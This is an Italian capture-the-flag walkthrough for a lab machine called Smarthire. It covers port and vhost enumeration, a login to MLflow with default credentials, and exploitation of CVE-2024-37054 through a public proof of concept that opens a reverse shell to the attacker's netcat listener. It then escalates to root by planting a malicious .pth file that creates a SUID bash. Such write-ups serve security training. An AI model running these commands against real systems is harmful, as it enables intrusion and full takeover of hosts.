# Smarthire

**OS:** Linux (Ubuntu)  
**Difficoltà:** Media  
**Tecniche:** Enumerazione servizi, fuzzing vhost, MLflow default credentials, CVE-2024-37054 (pickle deserialization), Python library hijacking via `.pth` injection
**IP target:** 10.129.34.178
**IP attaccante:** 10.10.15.219
## Recon
### Ricognizione iniziale
**Comando: scansione completa delle porte TCP**
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.34.178`
**Risultato:**
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-17 21:26 CEST
Initiating SYN Stealth Scan at 21:26
Scanning 10.129.34.178 [65535 ports]
Discovered open port 80/tcp on 10.129.34.178
Discovered open port 22/tcp on 10.129.34.178
Completed SYN Stealth Scan at 21:26, 9.81s elapsed (65535 total ports)
Nmap scan report for 10.129.34.178
Host is up, received user-set (0.031s latency).
Scanned at 2026-05-17 21:26:38 CEST for 10s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65538 (2.622MB)
```

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

**Comando: scansione dettagliata sulle porte scoperte**
`sudo nmap -sC -sV -O -p22,80 10.129.34.178`
**Risultato:**
```
tarting Nmap 7.95 ( https://nmap.org ) at 2026-05-17 21:27 CEST
Nmap scan report for smarthire.htb (10.129.34.178)
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Overview | SmartHIRE
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
```
- **22/tcp** – OpenSSH 8.9p1 Ubuntu
- **80/tcp** – nginx 1.18.0 (titolo: _Overview | SmartHIRE_)
- Hostname rilevato: `smarthire.htb` 
### Enumerazione del web server
**Gobuster directory scan:**
`gobuster dir -u http://smarthire.htb -w /usr/share/wordlists/dirb/common.txt`
**Risultato:**
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://smarthire.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 6160]
/logout               (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 6499]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### Accesso alla pagina web http://smarthire.htb

**Visita manuale** di `http://smarthire.htb`: pagina con funzionalità di **login** e **registrazione nuovo utente** (**test:test**).
Registrazione di un utente test e accesso alla dashboard.
**Dashboard funzionalità:**
- **Train Model:** upload CSV
- **Make Predictions:** upload CSV + "Analyze Resume"
### Scoperta del sottodominio `models.smarthire.htb`

**Vhost fuzzing con ffuf:**
`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://smarthire.htb" -H "Host: FUZZ.smarthire.htb" -fs 178`
**Risultato:**
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://smarthire.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.smarthire.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 25ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1739 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```
Troviamo il sottodominio **models**  (Status: 401)
### Accesso alla pagina web http://models.smarthire.htb

**Visita manuale** di `http://models.smarthire.htb`: pagina con funzionalità di **login**

Fatti alcuni tentativi con **credenziali di default**, trovato l'accesso con **admin:password**
Accediamo alla dashboard di **mlflow** versione **2.14.1**
**Dashboard funzionalità**:
- **Experiments**: `+ New Run` -> `using Prompt Engineering` / `using Notebook`
- **Models**: `Create a model`
## MLFlow - CVE-2024-37054

**MLflow** è una piattaforma **open source** usata per gestire il ciclo di vita di progetti di **machine learning** e applicazioni basate su **LLM e agenti AI**. Le versioni fino alla **2.14.3** sono esposte alla vulnerabilità **CVE-2024-37054**.
La **CVE-2024-37054** è una vulnerabilità di **MLflow** classificata come **unsafe deserialization** — più precisamente, **deserializzazione non sicura di oggetti `cloudpickle`** nei modelli **PyFunc**. Può portare a **esecuzione di codice arbitrario** sul computer della vittima.
### Il concetto chiave: cos’è la deserializzazione
In Python, librerie come `pickle` e `cloudpickle` permettono di:
1. trasformare un oggetto Python in dati salvabili su file;
2. ricaricare quei dati per ricostruire l’oggetto originale.

Il problema è che **un file pickle non contiene solo dati innocui**: può contenere istruzioni che, durante il caricamento, fanno eseguire codice Python. Per questo motivo:

> **caricare un file pickle proveniente da una fonte non fidata equivale, potenzialmente, a eseguire codice non fidato.**
### Cosa succede in MLflow
MLflow permette di salvare e caricare modelli nel formato **PyFunc**. Un attaccante può:
1. creare un **modello PyFunc malevolo**;
2. inserire al suo interno un oggetto `cloudpickle` manipolato;
3. caricarlo su un server MLflow;
4. aspettare che un utente lo scarichi o lo apra
### Sfruttamento CVE-2024-37054
Per sfruttare la vulnerabilità usiamo il seguente **POC**:
https://github.com/ben-slates/CVE-2024-37054
#### Installazione
**Necessari:** Python 3.7+, `requests`

```shell
git clone https://github.com/ben-slates/CVE-2024-37054
cd CVE-2024-37054
```
#### Utilizzo

```shell
# Lanciare un listener
nc -lvnp 4444

# Lanciare l'exploit
python3 poc.py <TARGET_URL> <MLFLOW_URL> <LHOST> <LPORT>
```
#### Comando utilizzato
Credenziali dell'utente creato su http://smarthire.htb:
- username: **test**
- password: **test**
Credenziali http://models.smarthire.htb:
- username: **admin**
- password: **password**

```
python3 poc.py http://smarthire.htb http://models.smarthire.htb 10.10.15.219 4444 \
    --mlflow-creds admin:password \
    --app-username test \
    --app-password test
```
## User svcweb

Otteniamo una shell come utente **svcweb**. Nella cartella **/home/svcweb** troviamo la user flag
## Privilege esclation

Con `sudo -l`

```
Matching Defaults entries for svcweb on smarthire:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

Questo significa che possiamo eseguire **come root** lo script `mlflowctl.py` con **Python 3.10**, passandogli qualsiasi argomento (`*`). Non possiamo modificare lo script (è di proprietà di root e non scrivibile), ma possiamo influenzarne l’esecuzione indirettamente.
### Leggiamo il codice dello script

Con `cat /opt/tools/mlflow_ctl/mlflowctl.py` abbiamo visto:

``` python
from pathlib import Path
import sys
import site
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"
# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
def main():
    import mlflow_actions, backup_models
    # ... poi gestisce gli argomenti
```

Il punto cruciale è il ciclo `for` che itera su tutte le sottodirectory di `plugins/` e chiama **`site.addsitedir()`** per ognuna.  
La funzione `site.addsitedir()` non solo aggiunge la directory al `sys.path` (permettendo a Python di trovare moduli al suo interno), ma **processa automaticamente** i file con estensione `.pth` presenti nella directory. Un file `.pth` può contenere percorsi aggiuntivi da aggiungere a `sys.path`, ma anche – e qui sta il pericolo – **righe che iniziano con `import`**, che vengono **eseguite immediatamente** all’aggiunta della directory.
### Troviamo una directory scrivibile

Ispezionando la struttura dei plugin:

```
ls -la /opt/tools/mlflow_ctl/plugins/
# drwxr-xr-x 4 root root 4096 Feb 19 18:10 core
# drwxrwxr-x 2 root devs 4096 May 12 15:22 dev   <-- !! scrivibile dal gruppo devs
```

E il nostro utente `svcweb` appartiene al gruppo `devs` (come confermato da `id`).  
La directory `dev` è vuota, ma poiché lo script chiama `site.addsitedir()` su di essa, qualsiasi file `.pth` che inseriamo lì verrà eseguito con i privilegi di root quando lanciamo lo script con `sudo`.
### Il payload: `.pth` malevolo

Creiamo un file `.pth` che contenga una riga `import` seguita da codice arbitrario.  
Il payload più semplice è far sì che il codice copi `/bin/bash` in `/tmp` e gli assegni il bit SUID (per mantenere i privilegi di root):

```
echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

Il file `exploit.pth` ora contiene esattamente:

```
import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
```

Quando Python processa il `.pth`, la riga `import os; ...` viene eseguita. Poiché l’intera esecuzione di `mlflowctl.py` avviene come root (grazie a `sudo`), il comando `os.system(...)` viene lanciato con i massimi privilegi.
### Esecuzione e ottenimento di root

Non dobbiamo fare altro che invocare lo script con `sudo`, passandogli un argomento qualsiasi (ad esempio `status`):

```
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Appena Python avvia lo script, scorre i `sitedir` e processa il nostro `.pth`. Il payload viene eseguito immediatamente dallo script.  Ora nella directory `/tmp` troviamo una copia di bash con il SUID impostato:

```
ls -la /tmp/bash
-rwsr-sr-x 1 root root 1183448 ... /tmp/bash
```

Lanciandola con l’opzione `-p` (per preservare l’effective UID), otteniamo una shell di root:

```
/tmp/bash -p
```

Nella cartella **/root** troviamo la root flag.
